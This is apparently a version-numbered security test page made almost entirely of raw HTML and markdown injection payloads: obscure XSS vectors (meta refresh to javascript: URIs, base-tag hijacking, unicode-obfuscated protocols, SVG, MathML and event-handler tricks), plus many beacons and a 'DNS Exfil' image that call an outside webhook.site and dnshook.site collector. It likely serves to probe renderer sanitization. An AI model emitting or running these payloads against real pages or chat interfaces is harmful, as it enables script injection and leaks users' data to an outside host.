# Security Research - v41

## Obscure Attack Vectors & Browser-Specific Behaviors

Testing lesser-known XSS vectors, browser quirks, and edge cases.

---

### 1) CSS Injection Attempts

<style>body{background:url('https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/css-bg.gif')}</style>

<div style="background:url('https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/inline-bg.gif')">CSS bg</div>

<div style="behavior:url(script.htc)">IE behavior</div>

<div style="-moz-binding:url('test.xml#xss')">Firefox binding</div>

<div style="list-style-image:url('https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/list-style.gif')">List style</div>

---

### 2) Meta Tag Injection

<meta http-equiv="refresh" content="0;url=https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/meta-refresh">

<meta http-equiv="refresh" content="0;url=javascript:alert(1)">

<meta name="referrer" content="unsafe-url">

<meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline'">

---

### 3) Link Tag Injection

<link rel="stylesheet" href="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/style.css">

<link rel="icon" href="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/favicon.ico">

<link rel="prefetch" href="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/prefetch.html">

<link rel="dns-prefetch" href="//prefetch.6c53ebc7-83d8-4172-9cfa-78099857331c.dnshook.site">

<link rel="preconnect" href="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c">

---

### 4) Base Tag Hijacking

<base href="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/">

[relative link after base](test.gif)

![relative img after base](img.gif)

---

### 5) Object/Embed/Applet

<object data="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/object.swf"></object>

<embed src="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/embed.swf"></embed>

<applet code="test" codebase="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/"></applet>

---

### 6) XML/XHTML Specific

<xml id="test"><x><script>alert(1)</script></x></xml>

<import implementation="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/test.html">

<?xml version="1.0"?><script>alert(1)</script>

---

### 7) HTML5 Form Features

<form action="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/form" method="GET">
<input type="text" name="test" autofocus onfocus="alert(1)">
<button formaction="javascript:alert(1)">Submit</button>
</form>

<input type="image" src="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/input-img.gif">

<button type="submit" formaction="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/button">Button</button>

---

### 8) Frameset/Frame

<frameset><frame src="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/frame.html"></frame></frameset>

<frame src="javascript:alert(1)">

---

### 9) Math ML Advanced

<math><maction actiontype="statusline" xlink:href="javascript:alert(1)">Click</maction></math>

<math><annotation-xml encoding="application/xhtml+xml"><img src="x" onerror="alert(1)"></annotation-xml></math>

<math xlink:href="javascript:alert(1)">Math XLink</math>

---

### 10) Attribute Breakout

<img src="test.gif" alt="" onload="alert(1)" ">

<a href="test" " onclick="alert(1)">Breakout link</a>

<div title='test' onclick='alert(1)'>Div breakout</div>

<img src=`https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/backtick.gif`>

---

### 11) Unicode Tricks (Advanced)

<a href="javascript:alert(1)">Control char prefix</a>

<a href="\u006aavascript:alert(1)">JSON escape</a>

<a href="&#1;javascript:alert(1)">Entity control char</a>

<script\x00>alert(1)</script>

<a href="jav​ascript:alert(1)">Zero-width space</a>

<a href="jav ascript:alert(1)">NBSP in protocol</a>

---

### 12) Template/Slot Elements

<template><script>alert(1)</script></template>

<template><img src="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/template.gif"></template>

<slot name="test"><script>alert(1)</script></slot>

---

### 13) Shadow DOM Escape (HTML)

<div><shadow><content><script>alert(1)</script></content></shadow></div>

<div><slot><script>alert(1)</script></slot></div>

---

### 14) Custom Elements

<custom-element onclick="alert(1)">Custom</custom-element>

<x-xss onclick="alert(1)">X-XSS</x-xss>

<script-x>alert(1)</script-x>

---

### 15) Portal/Fenced Frame

<portal src="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/portal.html"></portal>

<fencedframe src="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/fenced.html"></fencedframe>

---

### 16) Deprecated/Obsolete Tags

<bgsound src="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/sound.wav">

<listing><script>alert(1)</script></listing>

<xmp><script>alert(1)</script></xmp>

<plaintext><script>alert(1)</script>

<blink onclick="alert(1)">Blink</blink>

<spacer type="block" width="100" height="100">

---

### 17) Canvas XSS

<canvas id="c" onclick="alert(1)"></canvas>

<canvas id="c"><script>alert(1)</script></canvas>

---

### 18) Audio/Video Events

<audio src="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/audio.mp3" onloadstart="alert(1)">

<video src="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/video.mp4" onloadstart="alert(1)">

<video poster="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/poster.gif"></video>

<track src="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/track.vtt" kind="subtitles">

---

### 19) Use XLink (SVG)

<svg><use xlink:href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>"></use></svg>

<svg><use href="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/external.svg#test"></use></svg>

---

### 20) HTML Imports (deprecated)

<link rel="import" href="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/import.html">

---

### 21) Manifest

<html manifest="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/cache.manifest">

---

### 22) ARIA Attributes

<div role="button" aria-label="<script>alert(1)</script>" onclick="alert(1)">ARIA</div>

<img src="https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/aria.gif" aria-describedby="<script>">

---

### DNS Exfil

![DNS](https://v41-dns.6c53ebc7-83d8-4172-9cfa-78099857331c.dnshook.site/dns.gif)

### Canary

![Canary](https://webhook.site/6c53ebc7-83d8-4172-9cfa-78099857331c/v41-canary.gif)

---

*v41 - Obscure attack vectors*
